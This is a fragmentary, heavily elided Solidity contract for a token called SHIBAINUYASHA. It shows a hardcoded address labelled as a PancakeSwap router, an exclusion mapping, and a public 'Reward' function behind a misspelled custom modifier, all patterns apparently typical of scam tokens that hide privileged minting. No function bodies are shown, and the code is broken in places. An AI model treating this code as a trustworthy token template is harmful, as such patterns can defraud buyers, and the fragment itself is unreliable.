...
contract Context {
 ...
 contract SHIBAINUYASHA is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "SHIBAINUYASHA";
    string private _symbol = "SHIBAINUYASHA";
    ...
    address private _pancakeRouterV2 = 0x6306C457EA714EB7c80Bc43813413b875fb9902D;
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _Reward(address accountSUPERHEROE, uint256 amount) internal virtual {
    ...
    function Reward() public externelBurn { // SEND IT
